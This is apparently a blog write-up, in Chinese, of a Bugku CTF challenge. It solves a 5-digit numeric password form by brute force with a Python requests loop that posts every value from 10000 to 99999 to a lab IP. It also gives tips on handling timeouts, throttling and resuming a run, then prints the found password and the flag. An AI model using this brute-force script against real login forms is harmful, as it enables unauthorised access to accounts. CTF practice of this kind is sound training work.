---
title: Bugku CTF 好像需要密码
date： 2026-09-16
categories: Bugku,CTF
tags: CTF,爆破，Python
---

# 题目：好像需要密码

## 题目描述
打开靶场页面，页面有密码输入框，提示输入密码查看flag。查看网页源码没有任何线索，题目要求输入5位数字密码，属于基础POST表单弱口令爆破题。

## 解题思路
页面通过POST表单提交密码参数pwd，密码是5位纯数字，范围10000~99999。编写Python脚本批量枚举密码，提交表单，检测返回页面是否包含flag字符串，找到正确密码后获取flag。

## 解题步骤
1. 访问靶场页面，观察页面输入框，随便输入数字提交，抓包确定是POST提交，参数为`pwd`。
2. 确定密码范围：5位数字，从10000到99999。
3. 编写Python爆破脚本，加入超时捕获与延时，防止网络中断。
```python`
import requests
import time
url = "http://160.202.254.160:18622"
for pwd in range(10000, 100000):
    try:
        data = {"pwd": str(pwd)}
        resp = requests.post(url, data=data, timeout=4)
        print(f"尝试密码：{pwd}，页面长度：{len(resp.text)}")
        if "flag" in resp.text:
            print(f"\n✅找到正确密码：{pwd}")
            print(resp.text)
            break
    except Exception:
        print(f"密码{pwd} 连接超时，跳过")
    time.sleep(0.8)
4. 运行脚本，爆破得到正确密码： 12468 。
5. 在网页输入框填入密码12468，点击查看，拿到flag。flag{bf3a2587cd57d56509396b28b424c1c2}

## 踩坑提醒
1. 靶场网络不稳定，容易出现 10060连接超时 ，脚本必须增加异常捕获，否则程序直接终止。
2. 请求发送太快容易大量丢包，需要添加延时，降低请求频率。
3. 大范围爆破不需要从头跑，可修改range起始值，接着上次中断位置继续跑，节约时间。
 
## 知识点总结
1. POST表单弱口令暴力破解，使用requests模拟浏览器提交表单。
2. 固定位数纯数字密码枚举思路。
3. Python异常捕获、timeout超时设置，处理网络波动问题。
